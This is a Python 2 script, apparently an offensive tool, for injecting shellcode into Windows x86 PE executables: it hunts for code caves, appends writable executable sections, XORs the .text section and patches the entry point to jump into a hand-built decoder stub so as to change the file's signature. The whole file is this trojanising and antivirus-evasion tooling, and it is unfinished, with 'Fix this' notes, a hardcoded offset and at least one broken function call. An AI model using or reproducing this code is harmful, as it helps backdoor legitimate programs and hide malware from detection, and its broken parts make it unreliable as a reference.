#!/usr/bin/python
# -*- coding: utf-8 -*-
# Credits:
# http://git.n0p.cc/?p=SectionDoubleP.git;a=blob;f=SectionDoubleP.py
# https://msdn.microsoft.com/en-us/library/ms809762.aspx
#
# TODO
#   - Add new section to put shellcode into
#   - Find code cave to put shellcode into
#   - XOR .text and/or .Xdata sections
#   - Fix prologue (for XOR sections)
from binascii import hexlify, unhexlify # remove
import sys
import os
import random
import string
import struct
try:
    import pefile
    import argparse
    from pwn import disasm, asm
except:
    print "Please install the following modules to ensure %s works" % (sys.argv[0])
    print " - pefile"
    print " - argparse"
    print " - pwn"
    sys.exit(1)

# Load PE file
def load_pe_file(filename):
    if os.path.isfile(filename):
        print "\n[*] Loading PE file => \"%s\"" % (filename)
        try:
            return pefile.PE(filename)
        except pefile.PEFormatError:
            print "[!] File (%s) doesn't seem to be a PE file" % (filename)
            sys.exit(1)
    else:
        print "\n[!] File (%s) doesn't exist" % (filename)
        sys.exit(1)

# Write new PE file
def write_PE_file(pe_struct, out_filename):
    print "\n[*] Writing new PE file => \"%s\"" % (out_filename)
    pe_struct.write(filename=out_filename)

# Go through all PE sections (and display them)
def iterate_trough_pe_sections(pe_struct):
    print " - PE sections - %d section(s)" % (pe_struct.FILE_HEADER.NumberOfSections)
    print "\t\tVOffset\t\tVSize\t\tSize\t\tName"
    print "\t\t-----------------------------------------------------"
    for section in pe_struct.sections:
        print "\t\t%-10s\t%-10s\t%-10s\t%-10s" % (hex(section.VirtualAddress), hex(section.Misc_VirtualSize), hex(section.SizeOfRawData), section.Name.replace('\x00',''))

# Dump opcodes from PE, and display ASM
def dump_data(pe, address, size):
    blob =  pe.get_data(address, size)
    for l in disasm(blob, arch="i386").split("\n"):
        print "\t%s" % (l)

# Perform a quick analysis of PE file
def pe_analysis(pe_struct):
    print "\n[*] Analysis"
    # Entry Point
    print " - Entry point: 0x%x" % (pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint)
    # ASLR
    if (pe_struct.OPTIONAL_HEADER.DllCharacteristics & 0x0040):
        print " - ASLR is enabled"
    else:
        print " - ASLR is disabled"
    # Sections
    iterate_trough_pe_sections(pe_struct)
    # Requires pwntools
    print "\n - ASM instructions @entry point"
    dump_data(pe_struct, pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, 30)

# Look for code cave inside PE file's sections
def find_code_cave(pe_struct, min_size=100):
    print "[*] Looking for code caves"
    for section in pe_struct.sections:
        print "\t- Section: %s" % (section.Name)
        current_size = 0
        n = 0
        current_address = ""
        for d in section.get_data():
            if d == "\x00":
                current_size += 1
                current_address = section.VirtualAddress
            else:
                if current_size >= min_size:
                    #print hex(section.PointerToRawData + n - current_size)
                    print "\t-> Found a code cave: %d bytes, starting @%s" % (current_size, hex(current_address))
                current_size = 0
                current_address = ""
            n+=1

def adjust_optional_header(pe_struct):
    pe_struct.OPTIONAL_HEADER.SizeOfImage = pe_struct.sections[-1].VirtualAddress + pe_struct.sections[-1].Misc_VirtualSize
    pe_struct.OPTIONAL_HEADER.SizeOfCode = 0
    pe_struct.OPTIONAL_HEADER.SizeOfInitializedData = 0
    pe_struct.OPTIONAL_HEADER.SizeOfUninitializedData = 0

    for section in pe_struct.sections:
        if section.Characteristics & 0x00000020:
            pe_struct.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
        if section.Characteristics & 0x00000040:
            pe_struct.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
        if section.Characteristics & 0x00000080:
            pe_struct.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    return pe_struct

def create_new_section(pe_struct, sectionName = ".NewSec", virtualSize = 0x1000, pattern = "\x00", flags = 0xE00000E0):
    print "\n[*] Creating new section (\"%s\")" % (sectionName)

    # File alignment
    alignment = pe_struct.OPTIONAL_HEADER.FileAlignment
    # Section alignment
    SectionAlignment = pe_struct.OPTIONAL_HEADER.SectionAlignment
    # Get latest section
    latest_section = pe_struct.sections[-1]

    data = virtualSize * "\x00"
    offset_for_new_section = hex(latest_section.VirtualAddress + latest_section.SizeOfRawData)

    print " - Append %d bytes to PE file" % (virtualSize)

    # Append data to file
    full_length = latest_section.PointerToRawData + latest_section.SizeOfRawData
    pe_struct.__data__ = pe_struct.__data__[:full_length] + data

    # Find correct offset (with section alignment)
    virtualAddress = (pe_struct.sections[-1].VirtualAddress + pe_struct.sections[-1].Misc_VirtualSize - (pe_struct.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)

    # Add data (of the section header) to the file
    # 0x28 size of section header
    section_table_offset = pe_struct.DOS_HEADER.e_lfanew + 4 + pe_struct.FILE_HEADER.sizeof() + pe_struct.FILE_HEADER.SizeOfOptionalHeader
    section_offset = section_table_offset + pe_struct.FILE_HEADER.NumberOfSections * 0x28

    # Add data of the new section header to PE file
    pe_struct.set_bytes_at_offset(section_offset, sectionName)              # Name of new section
    pe_struct.set_dword_at_offset(section_offset + 0x08, virtualSize)       # virtualSize
    pe_struct.set_dword_at_offset(section_offset + 0x0C, virtualAddress)    # virtualAddress
    pe_struct.set_dword_at_offset(section_offset + 0x10, virtualSize)       # RawSize
    pe_struct.set_dword_at_offset(section_offset + 0x14, full_length)       # RawAddress
    pe_struct.set_dword_at_offset(section_offset + 0x18, 0x00000000)        # RelocAddress
    pe_struct.set_dword_at_offset(section_offset + 0x1C, 0x00000000)        # LineNumbers
    pe_struct.set_word_at_offset(section_offset + 0x20, 0x0000)             # RelocationsNumber
    pe_struct.set_word_at_offset(section_offset + 0x22, 0x0000)             # LinenumbersNumber
    pe_struct.set_dword_at_offset(section_offset + 0x24, flags)             # Flags

    # Add (+1) new section
    pe_struct.FILE_HEADER.NumberOfSections +=1

    pe_struct.parse_sections(section_table_offset) # Fetch the PE file sections
    pe_struct = adjust_optional_header(pe_struct)

    return pe_struct

# Find a specific section (with name), and give it back (with index)
def find_section(pe_struct, section_name):
    index = 0
    for section in pe_struct.sections:
        if section_name in section.Name:
            return section, index
        index+=1
    return None,-1

# Hide section (.text) through a XOR routine
def hide_xor(pe_struct, prologue, prologue_offset):
    new_pe_file = create_new_section(pe_struct, sectionName=".zebi")
    iterate_trough_pe_sections(pe_struct)

    # Get latest section
    latest_section = new_pe_file.sections[-1]
    # Figure out where to JMP (relative) from EntryPoint
    jmp_addr = latest_section.VirtualAddress - new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint - 1
    # relative JMP (use call to push @ on stack)
    jmp_shellcode = b"\xE8" + struct.pack("<I", jmp_addr)
    # Find size (and index) of a specific section
    section, index = find_section(pe_struct, section_name = ".text")

    # Remove this?
    diff_start_section = 0 #(new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint - section.VirtualAddress)+5
    diff_end_section = (section.VirtualAddress + section.SizeOfRawData) - (pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint)

    # Get XOR routine
    xor_routine = xor_routine_asm(diff_end_section)

    # Need to adjust for prologue
    if prologue_offset != -1:
        #print hex(new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint + prologue_offset)
        #print hex(section.VirtualAddress + (len(xor_routine)/2)) # shellcode size until prologue
        #print hex((section.VirtualAddress + (len(xor_routine)/2)) - (new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint + prologue_offset))

        current_addr = latest_section.VirtualAddress + len(xor_routine)
        jmp_to = pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + prologue_offset

        print hex(current_addr)
        print hex(jmp_to)
        #xor_routine += "\xe8" + "\x46\x52\xfd\xff"

    xor_routine += "\xff\xe0"                           # JMP EAX

    # Change code @ entry point
    new_pe_file.set_bytes_at_rva(new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint, jmp_shellcode)
    # Update code to add XOR routine
    new_pe_file.set_bytes_at_rva(latest_section.VirtualAddress, xor_routine)

    # Make section writable
    section.Characteristics = 0xE00000E0

def figure_prologue(pe_struct):
    prologue_instruction = get_ASM_instruction(pe_struct, pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, 10)

    # Try to figure (and patch) EntryPoint instructions
    try:
        inst = prologue_instruction.split("\n")[0]
        if "call" in inst.lower():                  # Patch with relative offset
            # Fix this
            prologue = inst.split("  ")[0].replace(" ","")
            offset = 0x28f
            return prologue, offset
        else:
            prologue = inst.split("  ")[0]
            return prologue, -1
    except:
        return None, -1


def get_ASM_instruction(pe_struct, start_address, size=5, args=None):
    blob = pe_struct.get_data(start_address, size)
    return disasm(blob, arch="i386", offset=0)

# XOR a specific section
def xor_section(pe_struct, section_name, key=0xA0, offset=5):
    section, index = find_section(pe_struct, section_name)

    if section != None:
        result = ""
        # Go through all data, from Entry point to end of section
        for d in section.get_data(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + offset):
            result += chr(ord(d)^key)
        # Add XORed data @ VirtualAddress
        pe_struct.set_bytes_at_rva(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + offset, result)

# Create XOR (ASM) routine
def xor_routine_asm(end_address, prologue="", key=0xA0):
    xor_routine = "\x90\x90\x90\x90"                    # NOPs
    xor_routine += "\x58"                               # POP EAX
    xor_routine += "\x50"                               # PUSH EAX
    xor_routine += "\x89\xc5"                           # MOV EBP, EAX
    xor_routine += "\x81\xc5" + p(end_address)          # ADD EBP, {ADDR}
    xor_routine += "\x80\x30" + chr(key)                # Key for XOR routine
    xor_routine += "\x40"                               # INC EAX
    xor_routine += "\x39\xe8"                           # CMP EAX, EBP
    xor_routine += "\x0f\x8e\xf4\xff\xff\xff"           # JLE backwards
    xor_routine += "\x58"                               # POP EAX
    #xor_routine += prologue
    #xor_routine += "\xe8\x8a\x02\x00\x00"
    #xor_routine += "\xff\xe0"                           # JMP EAX
    return xor_routine

def p(address):
    return struct.pack("<I", address)

# Args parser
def parser():
    parser = argparse.ArgumentParser(description="Add a shellcode to an existing PE (x86) or hide the content of a PE")
    parser.add_argument('--file', '-f', required=True, help="PE file to work with")
    parser.add_argument('--analyse', required=False, action="store_true", help="Analyse PE file (sections, entry point, etc.)")
    parser.add_argument('--fcc', required=False, action="store_true", help="Find code cave to put shellcode into (technique 1)")
    parser.add_argument('--new-sec', required=False, metavar="", help="Add shellcode into new PE section (technique 2)")
    parser.add_argument('--shellcode', required=False, metavar="FILE", help="Shellcode to be added to PE file")
    parser.add_argument('--new-sec-name', required=False, metavar="", help="New section name (5 chars max), otherwise will be randomly generated")
    parser.add_argument('--hide', required=False, metavar="FILE", help="Changes current PE's signature (techniques: xor)")
    parser.add_argument('--output', required=False, metavar="FILE", help="Output (PE) file")
    parser.add_argument('--test', required=False, action="store_true", help="test")
    return parser.parse_args()

if __name__ == "__main__":
    args = parser()

    # Load and analyse PE file
    pe_struct = load_pe_file(args.file)

    if (args.analyse): # Look for code cave
        pe_analysis(pe_struct)
    elif (args.fcc):
        find_code_cave(pe_struct)
    elif (args.hide):
        if args.hide == "xor":
            xor_section(pe_struct)
    elif (args.shellcode):
        # New section name
        new_section_name = ".%s" % (''.join(random.choice(string.ascii_letters) for x in range(5)))
        if args.new_sec_name is not None:
            if len(args.new_sec_name) > 0 and len(args.new_sec_name) <= 5:
                if (args.new_sec_name[0] != "."):
                    new_section_name = ".%s" % (args.new_sec_name)
                else:
                    new_section_name = "%s" % (args.new_sec_name)

        new_pe_file = create_new_section(pe_struct, sectionName=new_section_name)
        iterate_trough_pe_sections(pe_struct)
        write_PE_file(new_pe_file, args.output)

    elif (args.test):
        # For .text only (at the moment)

        # 1 - Find prologue (few ASM instructions)
        prologue, p_offset = figure_prologue(pe_struct)
        if prologue == None:
            print "[!] Can't figure out prologue, the program might crash at run time"


        print hex(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint)
        print (prologue)
        print hex(p_offset)

        # 2 - XOR corresponding section
        xor_section(pe_struct, ".text", offset=(len(prologue)/2))
        # 3 - Add XOR routine
        hide_xor(pe_struct, prologue, p_offset) # Fix this
        # 4 - Write PE file
        write_PE_file(pe_struct, "zeubi.exe")
